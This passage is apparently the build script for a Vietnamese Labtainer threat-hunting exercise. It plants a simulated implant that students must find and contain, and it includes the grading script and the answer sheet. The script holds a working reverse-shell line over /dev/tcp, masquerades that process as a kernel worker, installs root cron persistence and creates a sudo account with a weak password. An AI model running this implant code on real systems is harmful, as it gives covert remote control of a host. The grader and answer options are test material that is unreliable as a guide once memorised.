printf '%s %s netmon: conn dst=172.20.0.5 dport=C2PORT proc=kworker-helper\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" >> /var/log/netmon.log
# (b) Giu DUY NHAT mot ket noi reverse shell; nguy trang ten tien trinh = [kworker/0:2]
exec 9>/tmp/.beacon.lock
flock -n 9 || exit 0
touch /tmp/.c2beacon
exec -a "[kworker/0:2]" bash -i >& /dev/tcp/172.20.0.5/C2PORT 0>&1
SH
S cp /tmp/.sysmon /usr/local/bin/.sysmon
S chmod 755 /usr/local/bin/.sysmon
S chown root:root /usr/local/bin/.sysmon

# ===== 2) Monitor ket noi (sinh dong lanh tinh lam nhieu + xac nhan .5 khi con ket noi) =====
cat > /tmp/netmon <<'SH'
#!/bin/bash
exec 2>/dev/null
ss -tn state established 2>/dev/null | tail -n +2 | awk '{print $NF}' | while read peer; do
  ip=${peer%:*}; port=${peer##*:}
  case "$ip" in ""|127.*|0.0.0.0|::*|*[!0-9.]*) continue;; esac
  printf '%s %s netmon: conn dst=%s dport=%s proc=monitor\n' "$(date '+%b %e %H:%M:%S')" "$(hostname)" "$ip" "$port" >> /var/log/netmon.log
done
SH
S cp /tmp/netmon /usr/local/bin/netmon
S chmod 755 /usr/local/bin/netmon
S bash -c ': > /var/log/netmon.log; chmod 644 /var/log/netmon.log'

# ===== 3) Persistence: cron moi phut (quyen root) =====
S bash -c 'printf "%s\n%s\n" "* * * * * root /usr/local/bin/.sysmon" "* * * * * root /usr/local/bin/netmon" > /etc/cron.d/sysmon; chmod 644 /etc/cron.d/sysmon'
S service cron restart 2>/dev/null || S systemctl restart cron 2>/dev/null || true
S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true

# (Khong can ground-truth root: cong C2 ca nhan hoa duoc prestop doc lai tu chinh dong beacon
#  trong /var/log/netmon.log luc cham diem.)

# ===== 4) Wazuh agent: giam sat netmon.log (cho SV viet luat) + FIM (cho san qua dashboard) =====
LF='<localfile><log_format>syslog</log_format><location>/var/log/netmon.log</location></localfile>'
FIM='<directories realtime="yes" check_all="yes" report_changes="yes">/usr/local/bin,/etc/cron.d,/tmp</directories>'
S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
S sed -i "s#<syscheck>#<syscheck>\n    ${FIM}#" /var/ossec/etc/ossec.conf 2>/dev/null
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# ===== 6) analyst cho DEFENDER SSH sang dieu tra =====
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/dieu-tra.txt <<'FND'
# PHIEU SAN (Threat Hunting) - dien SO sau moi dau "=" (xem goi y trong read_first):
# H1 = octet cuoi IP C2 (172.20.0.X -> ghi X)
# H2 = tien trinh NGUY TRANG dang giu ket noi C2
#        1 sshd   2 [kworker/0:2]   3 systemd   4 cron
# H3 = co che DUY TRI (persistence) cua implant
#        1 /etc/crontab   2 /etc/cron.d/sysmon   3 ~/.bashrc   4 /etc/rc.local
# H4 = field trong netmon.log PHAN BIET dong DOC voi dong LANH TINH
#        1 proc=monitor   2 proc=kworker-helper   3 dport   4 hostname
# H5 = cong C2 (ca nhan hoa - tu san trong log giam sat / ss)
H1=
H2=
H3=
H4=
H5=
FND
S cp /tmp/dieu-tra.txt /home/analyst/dieu-tra.txt
S chown analyst:analyst /home/analyst/dieu-tra.txt
S chmod 644 /home/analyst/dieu-tra.txt

exit 0
__EOF_TH_7k2m__
cat > "$LAB/target/_bin/prestop" <<'__EOF_TH_7k2m__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (cham diem).
# Chi in co/OK, KHONG lo IOC (IP/cong/ten) -> tranh SV doc prestop.stdout de chep dap an.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

# Containment: da CHAN IP C2 (.5) bang iptables chua? -> chan la hanh dong containment.
# (Cham theo LUAT, khong dem ket noi 'ss': iptables DROP de ket noi ESTABLISHED con dinh
#  vai phut cho timeout -> dem ket noi se bao sai 'chua chan' du SV da chan dung.)
sudo -n iptables -S 2>/dev/null | grep -qE '172\.20\.0\.5(/32)?.*-j (DROP|REJECT)' && echo "CONTAINED"

# SLA: ket noi lanh tinh toi SIEM (.20) con song? (khong chan bua lam dut giam sat)
SL=$(ss -tn 2>/dev/null | grep -c '172.20.0.20:')
[ "${SL:-0}" -ge 1 ] && echo "SLA_OK"

# Phieu San: H1..H4 cham o goals.config (dap an co dinh). H5 (cong ca nhan hoa) doi chieu
# voi cong C2 THAT lay tu CHINH dong beacon trong /var/log/netmon.log (644, world-readable;
# cong von la IOC phai san ra). prestop KHONG tu phan H1..H4 - chi in phieu THO.
F=/home/analyst/dieu-tra.txt
TP=$(grep 'dst=172.20.0.5' /var/log/netmon.log 2>/dev/null | grep -oE 'dport=[0-9]+' | grep -oE '[0-9]+' | head -1)
SP=$(grep -E '^H5=' "$F" 2>/dev/null | grep -oE '=[0-9]+' | grep -oE '[0-9]+' | head -1)
[ -n "$TP" ] && [ "$SP" = "$TP" ] && echo "H5_OK"

echo "=== dieu-tra (phieu San cua analyst) ==="
sudo -n cat "$F" 2>/dev/null
cat "$F" 2>/dev/null

exit 0
__EOF_TH_7k2m__
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_TH_7k2m__'
cron
wazuh-agent
__EOF_TH_7k2m__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/attacker/*.py "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-threathunt"
